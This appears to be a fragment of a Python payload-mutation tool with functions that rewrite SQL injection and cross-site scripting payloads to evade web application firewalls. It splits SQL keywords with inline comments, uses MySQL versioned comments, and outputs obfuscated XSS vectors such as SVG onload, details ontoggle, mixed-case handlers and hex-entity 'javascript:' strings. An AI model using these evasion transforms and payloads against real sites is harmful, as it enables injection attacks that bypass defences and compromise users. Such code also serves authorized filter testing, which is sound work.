def _sql_keyword_split(p: str) -> str:
    kws = ["SELECT", "UNION", "FROM", "WHERE", "SLEEP", "BENCHMARK", "WAITFOR", "DELAY", "AND", "OR", "ORDER", "GROUP"]
    out = p
    for kw in kws:
        mid = max(1, len(kw) // 2)
        out = re.sub(kw, kw[:mid] + "/**/" + kw[mid:], out, flags=re.IGNORECASE)
    return out


def _mysql_versioned(p: str) -> str:
    kws = ["UNION", "SELECT", "SLEEP", "FROM", "WHERE", "AND", "OR"]
    out = p
    for kw in kws:
        out = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", out, flags=re.IGNORECASE)
    return out.replace(" ", "/**/")


def _xss_tag_polymorph(p: str) -> str:
    if "<script>alert(1)</script>" in p.lower():
        return "<Svg/OnLoad=confirm`1`>"
    if "onerror=alert(1)" in p.lower():
        return p.replace("onerror=alert(1)", "oNeRrOr=top['al'+'ert'](1)").replace(" ", "/")
    return p.replace("<script", "<sCrIpT\t").replace("alert(1)", "confirm(1)")


def _xss_svg_animate(p: str) -> str:
    return "<details/open/ontoggle=alert`1`>"


def _html_hex_entities(p: str) -> str:
    return p.replace("alert(1)", "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)").replace("javascript:", "jav&#x09;ascript:")


